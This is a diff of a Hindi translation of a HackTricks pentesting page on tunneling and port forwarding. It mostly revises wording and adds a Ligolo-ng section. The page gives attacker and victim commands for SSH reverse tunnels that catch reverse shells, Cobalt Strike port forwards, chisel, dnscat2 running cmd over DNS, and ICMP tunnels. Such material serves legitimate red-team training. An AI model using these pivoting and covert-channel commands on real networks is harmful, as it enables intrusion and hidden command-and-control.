@@ -1,21 +1,21 @@
 # Tunneling and Port Forwarding
 
 {% hint style="success" %}
-AWS हैकिंग सीखें और अभ्यास करें:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
-GCP हैकिंग सीखें और अभ्यास करें: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
-<summary>HackTricks का समर्थन करें</summary>
+<summary>Support HackTricks</summary>
 
-* [**सदस्यता योजनाएँ**](https://github.com/sponsors/carlospolop) देखें!
-* **हमारे** 💬 [**Discord समूह**](https://discord.gg/hRep4RUj7f) या [**telegram समूह**](https://t.me/peass) में शामिल हों या **Twitter** 🐦 पर हमें **फॉलो करें** [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
-* **हैकिंग ट्रिक्स साझा करें और** [**HackTricks**](https://github.com/carlospolop/hacktricks) और [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos में PRs सबमिट करें।
+* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
+* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
 
 </details>
 {% endhint %}
 
-## Nmap टिप
+## Nmap tip
 
 {% hint style="warning" %}
 **ICMP** और **SYN** स्कैन को सॉक्स प्रॉक्सी के माध्यम से टनल नहीं किया जा सकता, इसलिए हमें **पिंग डिस्कवरी** को **अक्षम** करना होगा (`-Pn`) और इसके काम करने के लिए **TCP स्कैन** (`-sT`) निर्दिष्ट करना होगा।
@@ -65,7 +65,7 @@ sudo ssh -L 631:<ip_victim>:631 -N -f -l <username> <ip_compromised>
 ```
 ### Port2hostnet (proxychains)
 
-स्थानीय पोर्ट --> समझौता किया गया होस्ट (SSH) --> कहीं भी
+स्थानीय पोर्ट --> समझौता किया गया होस्ट (SSH) --> जहाँ भी
 ```bash
 ssh -f -N -D <attacker_port> <username>@<ip_compromised> #All sent to local port will exit through the compromised server (use as proxy)
 ```
@@ -74,7 +74,7 @@ ssh -f -N -D <attacker_port> <username>@<ip_compromised> #All sent to local port
 यह आंतरिक होस्ट से DMZ के माध्यम से आपके होस्ट पर रिवर्स शेल प्राप्त करने के लिए उपयोगी है:
 ```bash
 ssh -i dmz_key -R <dmz_internal_ip>:443:0.0.0.0:7000 root@10.129.203.111 -vN
-# Now you can send a rev to dmz_internal_ip:443 and caputure it in localhost:7000
+# Now you can send a rev to dmz_internal_ip:443 and capture it in localhost:7000
 # Note that port 443 must be open
 # Also, remmeber to edit the /etc/ssh/sshd_config file on Ubuntu systems
 # and change the line "GatewayPorts no" to "GatewayPorts yes"
@@ -82,7 +82,7 @@ ssh -i dmz_key -R <dmz_internal_ip>:443:0.0.0.0:7000 root@10.129.203.111 -vN
 ```
 ### VPN-Tunnel
 
-आपको **दोनों उपकरणों में रूट** की आवश्यकता है (क्योंकि आप नए इंटरफेस बनाने जा रहे हैं) और sshd कॉन्फ़िगरेशन को रूट लॉगिन की अनुमति देनी होगी:\
+आपको **दोनों उपकरणों में रूट** की आवश्यकता है (क्योंकि आप नए इंटरफेस बनाने जा रहे हैं) और sshd कॉन्फ़िगरेशन को रूट लॉगिन की अनुमति देनी चाहिए:\
 `PermitRootLogin yes`\
 `PermitTunnel yes`
 ```bash
@@ -168,13 +168,13 @@ rportfwd stop [bind port]
 To note:
 
 - Beacon का रिवर्स पोर्ट फॉरवर्ड **टीम सर्वर के लिए ट्रैफ़िक टनल करने के लिए डिज़ाइन किया गया है, व्यक्तिगत मशीनों के बीच रिले करने के लिए नहीं**।
-- ट्रैफ़िक **बीकन के C2 ट्रैफ़िक के भीतर टनल किया जाता है**, जिसमें P2P लिंक शामिल हैं।
-- **रिवर्स पोर्ट फॉरवर्ड बनाने के लिए एडमिन विशेषाधिकार की आवश्यकता नहीं है** उच्च पोर्ट पर।
+- ट्रैफ़िक **बीकन के C2 ट्रैफ़िक के भीतर टनल किया गया है**, जिसमें P2P लिंक शामिल हैं।
+- **उच्च पोर्ट पर रिवर्स पोर्ट फॉरवर्ड बनाने के लिए प्रशासनिक विशेषाधिकारों की आवश्यकता नहीं है**।
 
-### rPort2Port local
+### rPort2Port स्थानीय
 
 {% hint style="warning" %}
-इस मामले में, **पोर्ट बीकन होस्ट में खोला जाता है**, टीम सर्वर में नहीं और **ट्रैफ़िक को कोबाल्ट स्ट्राइक क्लाइंट** (टीम सर्वर को नहीं) पर भेजा जाता है और वहां से निर्दिष्ट होस्ट:पोर्ट पर भेजा जाता है।
+इस मामले में, **पोर्ट बीकन होस्ट में खोला गया है**, टीम सर्वर में नहीं और **ट्रैफ़िक को कोबाल्ट स्ट्राइक क्लाइंट में भेजा जाता है** (टीम सर्वर में नहीं) और वहां से निर्दिष्ट होस्ट:पोर्ट पर भेजा जाता है।
 {% endhint %}
 ```
 rportfwd_local [bind port] [forward host] [forward port]
@@ -191,7 +191,7 @@ python reGeorgSocksProxy.py -p 8080 -u http://upload.sensepost.net:8080/tunnel/t
 ## Chisel
 
 आप इसे [https://github.com/jpillora/chisel](https://github.com/jpillora/chisel) के रिलीज़ पृष्ठ से डाउनलोड कर सकते हैं।\
-आपको **क्लाइंट और सर्वर के लिए समान संस्करण का उपयोग करना होगा।**
+आपको **क्लाइंट और सर्वर के लिए समान संस्करण का उपयोग करना होगा**।
 
 ### socks
 ```bash
@@ -206,6 +206,42 @@ python reGeorgSocksProxy.py -p 8080 -u http://upload.sensepost.net:8080/tunnel/t
 ```bash
 ./chisel_1.7.6_linux_amd64 server -p 12312 --reverse #Server -- Attacker
 ./chisel_1.7.6_linux_amd64 client 10.10.14.20:12312 R:4505:127.0.0.1:4505 #Client -- Victim
+```
+## Ligolo-ng
+
+[https://github.com/nicocha30/ligolo-ng](https://github.com/nicocha30/ligolo-ng)
+
+**एजेंट और प्रॉक्सी के लिए एक ही संस्करण का उपयोग करें**
+
+### टनलिंग
+```bash
+# Start proxy server and automatically generate self-signed TLS certificates -- Attacker
+sudo ./proxy -selfcert
+# Create an interface named "ligolo" -- Attacker
+interface_create --name "ligolo"
+# Print the currently used certificate fingerprint -- Attacker
+certificate_fingerprint
+# Start the agent with certification validation -- Victim
+./agent -connect <ip_proxy>:11601 -v -accept-fingerprint <fingerprint>
+# Select the agent -- Attacker
+session
+1
+# Start the tunnel on the proxy server -- Attacker
+tunnel_start --tun "ligolo"
+# Display the agent's network configuration -- Attacker
+ifconfig
+# Create a route to the agent's specified network -- Attacker
+interface_add_route --name "ligolo" --route <network_address_agent>/<netmask_agent>
+# Display the tun interfaces -- Attacker
+interface_list
+```
+### एजेंट बाइंडिंग और सुनना
+```bash
+# Establish a tunnel from the proxy server to the agent
+# Create a TCP listening socket on the agent (0.0.0.0) on port 30000 and forward incoming TCP connections to the proxy (127.0.0.1) on port 10000 -- Attacker
+listener_add --addr 0.0.0.0:30000 --to 127.0.0.1:10000 --tcp
+# Display the currently running listeners on the agent -- Attacker
+listener_list
 ```
 ## Rpivot
 
@@ -328,7 +364,7 @@ netsh interface portproxy delete v4tov4 listenaddress=0.0.0.0 listenport=4444
 # Load SocksOverRDP.dll using regsvr32.exe
 C:\SocksOverRDP-x64> regsvr32.exe SocksOverRDP-Plugin.dll
 ```
-अब हम **RDP** के माध्यम से **victim** से **`mstsc.exe`** का उपयोग करके **connect** कर सकते हैं, और हमें एक **prompt** प्राप्त होना चाहिए जिसमें कहा गया है कि **SocksOverRDP plugin is enabled**, और यह **listen** करेगा **127.0.0.1:1080** पर।
+अब हम **RDP** के माध्यम से **victim** से **connect** कर सकते हैं **`mstsc.exe`** का उपयोग करके, और हमें एक **prompt** प्राप्त होना चाहिए जिसमें कहा गया है कि **SocksOverRDP plugin is enabled**, और यह **listen** करेगा **127.0.0.1:1080** पर।
 
 **Connect** करें **RDP** के माध्यम से और victim मशीन में `SocksOverRDP-Server.exe` बाइनरी को अपलोड और निष्पादित करें:
 ```
@@ -342,7 +378,7 @@ netstat -antb | findstr 1080
 
 ## Windows GUI ऐप्स को प्रॉक्सी करें
 
-आप Windows GUI ऐप्स को [**Proxifier**](https://www.proxifier.com/) का उपयोग करके प्रॉक्सी के माध्यम से नेविगेट कर सकते हैं।\
+आप [**Proxifier**](https://www.proxifier.com/) का उपयोग करके Windows GUI ऐप्स को प्रॉक्सी के माध्यम से नेविगेट कर सकते हैं।\
 **Profile -> Proxy Servers** में SOCKS सर्वर का IP और पोर्ट जोड़ें।\
 **Profile -> Proxification Rules** में प्रॉक्सी करने के लिए प्रोग्राम का नाम और उन IPs के लिए कनेक्शन जोड़ें जिन्हें आप प्रॉक्सी करना चाहते हैं।
 
@@ -385,7 +421,7 @@ attacker> iodined -f -c -P P@ssw0rd 1.1.1.1 tunneldomain.com
 victim> iodine -f -P P@ssw0rd tunneldomain.com -r
 #You can see the victim at 1.1.1.2
 ```
-The tunnel will be very slow. You can create a compressed SSH connection through this tunnel by using:
+The tunnel बहुत धीमा होगा। आप इस टनल के माध्यम से एक संकुचित SSH कनेक्शन बना सकते हैं:
 ```
 ssh <user>@1.1.1.2 -C -c blowfish-cbc,arcfour -o CompressionLevel=9 -D 1080
 ```
@@ -404,7 +440,7 @@ victim> ./dnscat2 --dns host=10.10.10.10,port=5353
 ```
 #### **PowerShell में**
 
-आप [**dnscat2-powershell**](https://github.com/lukebaggett/dnscat2-powershell) का उपयोग करके PowerShell में dnscat2 क्लाइंट चला सकते हैं:
+आप [**dnscat2-powershell**](https://github.com/lukebaggett/dnscat2-powershell) का उपयोग करके powershell में dnscat2 क्लाइंट चला सकते हैं:
 ```
 Import-Module .\dnscat2.ps1
 Start-Dnscat2 -DNSserver 10.10.10.10 -Domain mydomain.local -PreSharedSecret somesecret -Exec cmd
@@ -418,18 +454,18 @@ listen [lhost:]lport rhost:rport #Ex: listen 127.0.0.1:8080 10.0.0.20:80, this b
 
 Proxychains `gethostbyname` libc कॉल को इंटरसेप्ट करता है और tcp DNS अनुरोध को socks प्रॉक्सी के माध्यम से टनल करता है। **डिफ़ॉल्ट** रूप से, **DNS** सर्वर जो proxychains उपयोग करता है वह **4.2.2.2** है (हार्डकोडेड)। इसे बदलने के लिए, फ़ाइल संपादित करें: _/usr/lib/proxychains3/proxyresolv_ और IP बदलें। यदि आप **Windows वातावरण** में हैं, तो आप **डोमेन कंट्रोलर** का IP सेट कर सकते हैं।
 
-## Go में टनल
+## गो में टनल
 
 [https://github.com/hotnops/gtunnel](https://github.com/hotnops/gtunnel)
 
 ## ICMP टनलिंग
 
-### Hans
+### हैंस
 
 [https://github.com/friedrich/hans](https://github.com/friedrich/hans)\
 [https://github.com/albertzak/hanstunnel](https://github.com/albertzak/hanstunnel)
 
-दोनों सिस्टम में रूट की आवश्यकता होती है ताकि tun अडाप्टर बनाए जा सकें और ICMP इको अनुरोधों का उपयोग करके उनके बीच डेटा टनल किया जा सके।
+दोनों सिस्टम में रूट की आवश्यकता होती है ताकि tun एडाप्टर बनाए जा सकें और ICMP इको अनुरोधों का उपयोग करके उनके बीच डेटा टनल किया जा सके।
 ```bash
 ./hans -v -f -s 1.1.1.1 -p P@ssw0rd #Start listening (1.1.1.1 is IP of the new vpn connection)
 ./hans -f -c <server_ip> -p P@ssw0rd -v
@@ -487,8 +523,8 @@ chmod a+x ./ngrok
 ```
 #### HTTP कॉल्स की स्निफिंग
 
-*XSS, SSRF, SSTI ... के लिए उपयोगी*
-सीधे stdout से या HTTP इंटरफेस [http://127.0.0.1:4040](http://127.0.0.1:4000) में।
+*XSS, SSRF, SSTI के लिए उपयोगी ...*
+stdout से सीधे या HTTP इंटरफेस [http://127.0.0.1:4040](http://127.0.0.1:4000) में।
 
 #### आंतरिक HTTP सेवा का टनलिंग
 ```bash
@@ -528,7 +564,7 @@ addr: file:///tmp/httpbin/
 <summary>HackTricks का समर्थन करें</summary>
 
 * [**सदस्यता योजनाएँ**](https://github.com/sponsors/carlospolop) जांचें!
-* **शामिल हों** 💬 [**Discord समूह**](https://discord.gg/hRep4RUj7f) या [**टेलीग्राम समूह**](https://t.me/peass) या **हमें** **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)** पर फॉलो करें।**
+* **शामिल हों** 💬 [**Discord समूह**](https://discord.gg/hRep4RUj7f) या [**telegram समूह**](https://t.me/peass) या **हमें** **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)** पर फॉलो करें।**
 * **हैकिंग ट्रिक्स साझा करें और** [**HackTricks**](https://github.com/carlospolop/hacktricks) और [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) गिटहब रिपोजिटरी में PR सबमिट करें।
 
 </details>
